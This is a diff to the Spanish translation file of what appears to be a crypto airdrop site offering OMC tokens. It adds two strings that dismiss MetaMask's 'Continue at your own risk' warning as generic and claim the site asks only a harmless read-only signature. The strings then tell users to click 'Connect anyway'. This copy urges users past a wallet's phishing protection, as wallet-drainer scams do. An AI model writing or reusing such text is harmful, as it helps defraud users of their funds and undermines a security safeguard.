@@ -338,6 +338,8 @@ window.I18N.es = {
   "wl.err_rejected": "Se rechazó la solicitud de firma.",
   "wl.err_no": "No se encontró ningún proveedor de cartera.",
   "wl.err_account": "No se pudo leer la dirección de la cartera.",
+"wl.risk_q": "¿Tu cartera muestra un aviso de “Continuar bajo tu propio riesgo”?",
+"wl.risk_a": "MetaMask y otras carteras muestran un aviso genérico de precaución en dominios recién lanzados y páginas relacionadas con airdrops. Es una protección integrada de la cartera, no un juicio sobre este sitio. OMC solo solicita una firma gratuita de solo lectura: sin transferencias, sin aprobaciones de tokens y sin gas. Si aparece el aviso, elige “Conectar de todos modos” para continuar.",
   "tk.eyebrow": "Progreso del airdrop",
   "tk.title": "Airdrop comunitario — en directo",
   "tk.sub": "Fondo de 20.000.000 OMC: entradas reclamadas, participantes y las últimas participaciones, actualizadas en directo.",
